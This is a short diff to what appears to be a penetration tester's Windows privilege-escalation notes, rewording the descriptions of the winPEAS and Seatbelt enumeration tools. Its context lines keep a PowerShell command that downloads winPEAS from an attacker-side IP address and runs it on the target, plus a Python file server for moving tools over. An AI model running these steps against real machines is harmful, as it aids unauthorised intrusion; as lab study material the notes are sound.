@@ -4,7 +4,7 @@ Having gained a foothold on a Windows machine by whatever mechanism the followin
 ## Automatic Enumeration
 
 ### winPEAS
-Below is a lengthy list of commands that you can make use of in the event that `winPEAS` & `seatbelt` are impossible to smuggle onto the machine or are blocked via AV somehow. But under most circumstances lets not be cringe and use the purpose-built tool to enumerate a Windows environment:
+Tool for the automatic discovery of interesting files, permissions misconfigurations etc.
 
 In Kali:
 ```bash
@@ -17,8 +17,7 @@ iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
 .\winPEAS.exe
 ```
 ### Seatbelt
-For `Seatbelt` search for `compiled seatbelt github download`, and grab the `Seatbelt.exe` file.
-Transfer to target in the usual fashion:
+Similar to `winPEAS` but different? Search for `compiled seatbelt github download`, and grab the `Seatbelt.exe` file. Transfer to target in the usual fashion:
 ```bash
 python3 -m http.server 80
 ```
